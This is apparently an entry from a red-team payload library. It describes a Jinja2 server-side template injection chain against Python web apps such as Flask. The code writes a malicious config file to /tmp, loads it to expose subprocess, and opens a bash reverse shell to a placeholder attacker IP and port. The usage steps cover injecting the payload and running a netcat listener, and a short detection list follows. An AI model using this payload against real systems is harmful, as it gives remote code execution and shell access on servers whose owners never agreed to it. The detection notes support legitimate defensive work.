---
id: a8b46526-653b-4160-9841-96fbff3132ca
type: code
language: Python
verified: true
created_at: '2023-04-06T03:56:39.879053+00:00'
updated_at: '2023-10-01T00:00:00.000000+00:00'
platforms:
  - Web
  - Linux
tags:
  - ssti
  - jinja2
  - rce
  - payload
  - reverse-shell
validated: true
---

# Jinja2-SSTI-Evil-Config-RCE-Payload

## Code

```python
# evil config
{{ ''.__class__.__mro__[2].__subclasses__()[40]('/tmp/evilconfig.cfg', 'w').write('from subprocess import check_output\n\nRUNCMD = check_output\n') }}

# load the evil config
{{ config.from_pyfile('/tmp/evilconfig.cfg') }}  

# connect to evil host
{{ config['RUNCMD']('/bin/bash -c "/bin/bash -i >& /dev/tcp/$_ATTACKER_IP/$_ATTACKER_PORT 0>&1"',shell=True) }}
```

## Description

This Jinja2 SSTI payload exploits template injection to achieve RCE by writing a malicious configuration file that exposes subprocess functionality, loading it into the application's config, and executing a TCP reverse shell. It targets Python web apps (e.g., Flask) where user input is rendered via Jinja2 without proper safeguards. The payload chains object introspection to access file writing capabilities, config loading, and command execution.

## Parameters

| Variable | Description | Example |
|----------|-------------|---------|
| $_ATTACKER_IP | IP address of the attacker's listener | 192.168.1.100 |
| $_ATTACKER_PORT | Port on which the attacker is listening for the reverse shell | 4444 |

## Usage

Inject the payload into a vulnerable SSTI input field in a web application, such as a config value or template parameter. Ensure a listener (e.g., `nc -lvnp $_ATTACKER_PORT`) is running on the attacker machine. The payload must be submitted in parts if the input is split across requests (e.g., separate submissions for writing, loading, and executing). Used in red team engagements for initial RCE on Python-based web servers.

## Detection

- Monitor web application logs for SSTI patterns like __class__.__mro__ or __subclasses__ in inputs.
- File system monitoring for suspicious writes to /tmp (e.g., evilconfig.cfg) or unusual Python files.
- Process monitoring for subprocess.check_output calls from web app contexts.
- Network logs for outbound TCP connections from web servers to external IPs on high ports.
- Enable Jinja2 debugging or WAF rules to block template injection attempts.

## Related

- [[procedures/Jinja2-RCE-via-SSTI-in-Evil-Config-File]]
